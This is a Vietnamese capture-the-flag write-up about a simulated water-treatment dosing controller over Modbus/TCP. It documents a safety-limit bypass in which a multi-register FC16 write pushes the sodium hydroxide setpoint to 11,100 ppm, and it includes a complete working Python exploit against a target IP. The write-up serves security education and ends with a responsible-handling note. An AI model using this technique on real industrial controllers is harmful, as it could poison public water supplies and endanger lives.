# OT#001 — WTP-1 Dosing Station: bypass FC16 validation trên dosing loop đang chạy

**Flag:** CTF{a95d4db0158d93bbe8d3290b503e7437}  
**Target:** 169.58.126.107:6000 (Modbus/TCP, unit 1)  
**Định dạng flag:** CTF{}

## Đề bài

> OT#001 — 45 điểm. Đây là dosing controller nhỏ của nhà máy xử lý nước, có thể truy cập trực tiếp qua mạng.
>
> SỰ CỐ:
>
> Tháng 2/2021, một operator ở nhà máy xử lý nước Oldsmar, Florida, thấy chuột tự di chuyển và setpoint sodium hydroxide (lye) nhảy từ 100ppm lên 11.100ppm do một bên lạ điều khiển từ xa. Sự việc được phát hiện và hoàn nguyên trước khi hóa chất tới nguồn nước.
>
> Tháng 11/2023, nhóm “CyberAv3ngers” xâm nhập PLC Unitronics dùng tại các trạm tăng áp nước ở Mỹ và Israel; các PLC có thể truy cập trực tiếp từ Internet mà gần như không có kiểm soát truy cập. Cả hai sự cố đều không cần memory-corruption exploit. Điểm chung là protocol cho phép bất kỳ ai có network access thay đổi dữ liệu tùy ý.
>
> https://otctf.pages.dev/water-treatment/

Trang briefing đặt tên thiết bị là WTP-1 Dosing Station, protocol Modbus TCP, payload là MBAP header + function code, authentication NONE, BY DESIGN, encryption NONE. Mục tiêu là “tạo tình trạng dosing nguy hiểm kéo dài trên endpoint đang chạy”. Ràng buộc nêu rõ: không source, không binary, không register map — dùng Modbus TCP client bất kỳ.

Service là một Modbus/TCP endpoint duy nhất, không session, không login, không allowlist. Setpoint, trạng thái bơm và alarm flag đều là holding register thường mà client nào cũng truy cập được.

## Phân tích

### Bề mặt truy cập

Máy không có pymodbus nên viết raw-socket client (scratch/mb.py, MBAP framing cùng FC1/2/3/4/5/6/15/16/17/43), xác thực với mock server local trước khi kết nối target.

Quét function code bằng PDU hợp lệ về cú pháp cho thấy firmware hỗ trợ rất ít:

| Function | Tên | Response |
|---:|---|---|
| 3 | Read Holding Registers | được hỗ trợ |
| 6 | Write Single Register | được hỗ trợ |
| 16 | Write Multiple Registers | được hỗ trợ |
| 1, 2, 4, 5, 15, 17, 43, 44, 65 | coils / inputs / device ID | ILLEGAL FUNCTION (0x01) |

Holding register dài 16 bit và address space dừng tại 255: FC3 @256 trả ILLEGAL DATA ADDRESS (0x02). Toàn bộ attack surface chỉ có ba function code và 256 register, truy cập Internet được mà không cần xác thực.

### Register map

Baseline dump địa chỉ 0–999 chỉ có một giá trị khác 0 (FC3 @0: 3=0x0001(1)). Thử từng address rồi theo dõi 20 register đầu theo thời gian cho map sau:

| Addr | Ý nghĩa | Hành vi |
|---:|---|---|
| 0 | NaOH setpoint (ppm) | FC6 và FC16 qty=1 nhận 0–200; 201+ → ILLEGAL DATA VALUE (0x03) |
| 1 | Process value PV (ppm) | phản ứng bậc một với setpoint; giảm về 0 khi SP=0 |
| 2 | Over-range alarm | bỏ qua write; 0 khi PV=855, 1 khi PV=1688 |
| 3 | Pump / mode state | baseline 1; register khác 0 duy nhất khi nghỉ |
| 4–99 | scratch | lưu giá trị thường, đọc lại giống nguyên văn |
| 100–118 | incident log | 19 register ASCII, mỗi register một ký tự, big-endian |

Step response xác nhận vai trò. Ghi reg1 = 5000 cho ra t+00 [(1, 4167), (2, 1), (3, 1)] rồi giảm về [(3, 1)] ở t+05 — register 1 là nồng độ đo được, không phải setpoint. Ghi reg0 làm reg1 bám đúng giá trị (SP=50 → PV=50, SP=200 → PV=200); mọi giá trị trên 200 bị từ chối. Register 3 trông như interlock, nhưng ghi 0 không gỡ giới hạn — giới hạn không phụ thuộc process state.

### Sai lệch validation

Giới hạn chỉ được kiểm tra trong đường ghi single-register. FC16 qty=1 được xử lý như write đơn và cũng bị kiểm tra; FC16 qty>1 ghi cả mảng mà không validate:

| Request | Kết quả |
|---|---|
| FC6 addr 0 = 11100 | ILLEGAL DATA VALUE (0x03) |
| FC16 addr 0, qty 1, [11100] | ILLEGAL DATA VALUE (0x03) |
| FC16 addr 0, qty 4, [11100, 0, 0, 1] | được chấp nhận — map thành [11100, 1850, 1, 1] |
| FC6 addr 0 = 200 / 201 | 200 được nhận, 201 bị từ chối |
| FC6 addr 3 = 0 rồi FC6 addr 0 = 11100 | vẫn ILLEGAL DATA VALUE |

Cùng bypass dùng được với mọi giá trị 16-bit: [3000, 0, 0, 1] và [65535, 0, 0, 1] đều được nhận, đưa PV lên 2862 và 62580. Đây giống vụ Oldsmar — ghi setpoint 11.100 ppm qua mạng — nhưng ở đây chỉ cần một PDU bốn register, không cần GUI session.

### Incident log

Register 100–118 là vùng lưu trữ có thể ghi bình thường; controller ghi ASCII log vào đó khi hazard đang hoạt động. Mỗi register chứa một ký tự ở byte cao nên cần decode big-endian:

```text
big-endian:    'CTF{a95d4db0158d93bbe8d3290b503e7437}\x00'
little-endian: 'TC{F9ad5d40b51d839bb8e3d92b005e34773\x00}'
```

Cách đọc little-endian bị sai hiển nhiên, xác nhận byte order. Chuỗi có 37 ký tự cộng NUL, lấp register 100 tới 118.

Log không phải dữ liệu tĩnh. Nó chỉ được ghi khi PV giữ trên vùng an toàn, rồi bị xóa khi setpoint về 0 — flag phụ thuộc trạng thái nhà máy, không phải constant trong firmware.

## Lời giải

### 1. Ghi setpoint qua multi-register path

Một FC16 PDU ghi đồng thời setpoint, process value, alarm flag và mode register. Vì quantity là 4 nên range check không chạy:

```bash
python mb.py --host 169.58.126.107 --port 6000 wmulti --addr 0 --values 11100,0,1,1
```

Response là FC16 echo bình thường (addr=0, qty=4); PV tăng từ 1850 lên 11100 ppm trong vài giây và over-range alarm bật.

### 2. Đọc lại incident log

```bash
python mb.py --host 169.58.126.107 --port 6000 read --fc 3 --addr 100 --qty 20
```

Sau khoảng 12,6 giây dosing vượt ngưỡng liên tục, controller ghi flag vào register 100–118. Poll toàn bộ 256 register rồi decode big-endian ổn định hơn đọc một vùng cố định vì log xuất hiện bất đồng bộ.

### 3. Khôi phục trạng thái nhà máy

Ghi [0, 0, 0, 1] từ address 0 sẽ đưa SP, PV và alarm về 0, đồng thời giữ mode register ở baseline 1.

## Mã khai thác

Bản tự chứa, không cần thư viện Modbus bên thứ ba.

```python
#!/usr/bin/env python3
"""OT#001 - WTP-1 dosing station: FC16 range-check bypass + incident-log read."""
import socket, struct, time

HOST, PORT, UNIT = "169.58.126.107", 6000, 1
SP, PV, ALARM, MODE = 0, 1, 2, 3


class Modbus:
    def __init__(self, host, port, unit=1, timeout=4.0):
        self.s = socket.create_connection((host, port), timeout)
        self.s.settimeout(timeout)
        self.unit, self.tx = unit, 0

    def _recv(self, n):
        buf = b""
        while len(buf) < n:
            chunk = self.s.recv(n - len(buf))
            if not chunk:
                raise ConnectionError("closed")
            buf += chunk
        return buf

    def req(self, pdu):
        self.tx = (self.tx + 1) & 0xFFFF
        self.s.sendall(struct.pack(">HHHB", self.tx, 0, len(pdu) + 1, self.unit) + pdu)
        head = self._recv(7)
        body = self._recv(struct.unpack(">H", head[4:6])[0] - 1)
        if body[0] & 0x80:
            raise RuntimeError("exception code 0x%02x" % body[1])
        return body[1:]

    def read(self, addr, qty):
        d = self.req(struct.pack(">BHH", 3, addr, qty))
        return list(struct.unpack(">%dH" % (d[0] // 2), d[1:1 + d[0]]))

    def write_single(self, addr, value):          # FC6  - applies the 200 ppm check
        return self.req(struct.pack(">BHH", 6, addr, value))

    def write_multi(self, addr, values):          # FC16 - qty>1 skips the check
        body = struct.pack(">%dH" % len(values), *values)
        return self.req(struct.pack(">BHHB", 16, addr, len(values), len(body)) + body)


def snapshot(c, n=256):
    regs = []
    for start in range(0, n, 125):
        regs += c.read(start, min(125, n - start))
    return regs


def flag_of(regs):
    text = b"".join(struct.pack(">H", r) for r in regs).decode("latin-1")
    i = text.find("CTF{")
    j = text.find("}", i)
    return text[i:j + 1] if i >= 0 and j > i else None


c = Modbus(HOST, PORT, UNIT)
print("baseline:", [(a, v) for a, v in enumerate(snapshot(c)) if v])

try:
    c.write_single(SP, 11100)
except RuntimeError as e:
    print("FC6  SP=11100 rejected: %s" % e)

t0 = time.time()
c.write_multi(SP, [11100, 0, 1, 1])      # SP, PV, ALARM, MODE in one PDU
print("FC16 SP,PV,ALARM,MODE = 11100,0,1,1 -> accepted")

regs = snapshot(c)
while time.time() - t0 < 90:
    regs = snapshot(c)
    f = flag_of(regs)
    print("t+%05.1fs SP=%s PV=%s alarm=%s flag=%s"
          % (time.time() - t0, regs[0], regs[1], regs[2], f))
    if f:
        break
    time.sleep(2.5)

print("regs 100..118:", regs[100:119])

c.write_multi(SP, [0, 0, 0, 1])          # leave the plant as we found it
time.sleep(10)
print("restored:", [(a, v) for a, v in enumerate(snapshot(c)) if v])
```

## Ghi chú

* Flag là dữ liệu phụ thuộc trạng thái, không nằm sẵn trong firmware. Nó chỉ xuất hiện ở register 100–118 khi setpoint còn 11100; ghi SP=0 xóa toàn log trong một poll. Đọc xong cần khôi phục.
* FC16 qty == 1 được đưa qua single-write path có validation, nên bypass cần ít nhất hai register trong PDU. “Multi” write một phần tử vẫn bị từ chối.
* Register 3 trông như interlock (là register khác 0 duy nhất lúc nghỉ) nhưng không phải. Ghi 0 không nâng giới hạn 200 ppm; limit nằm trong write path chứ không nằm ở process state.
* Decode log big-endian. Little-endian tạo TC{F9ad5d40b5..., dấu hiệu rõ là byte order sai.
* Độ phân giải poll ảnh hưởng thời điểm latch được báo: poll 2,5 giây cho t+10,6 giây; poll 5 giây cho first_flag_at=12.6s. Cả hai chỉ cùng lần ghi đó.
* Exploit chỉ dùng hành vi protocol thông thường. Không memory corruption, overflow hay ROP — như briefing kết luận về Oldsmar 2021 và CyberAv3ngers 2023. Controller truy cập Internet, không xác thực và chỉ validate safety limit ở một trong hai đường ghi. Đây là lỗi thiết kế, không phải implementation bug kiểu pwn.

**Xử lý có trách nhiệm.** Endpoint là mô phỏng plant do CTF cung cấp; chỉ gửi các write challenge yêu cầu. Sau capture cuối, setpoint, process value và alarm được trả về 0, register map được đối chiếu với baseline trước thử nghiệm ([(3, 1)], tức chỉ mode register khác 0). Trên dosing loop thật, cùng PDU sẽ bơm hóa chất không kiểm soát ở khoảng 55 lần giới hạn an toàn; phép thử như vậy cần khung thời gian được cấp phép, interlock vật lý và operator đứng cạnh bơm.
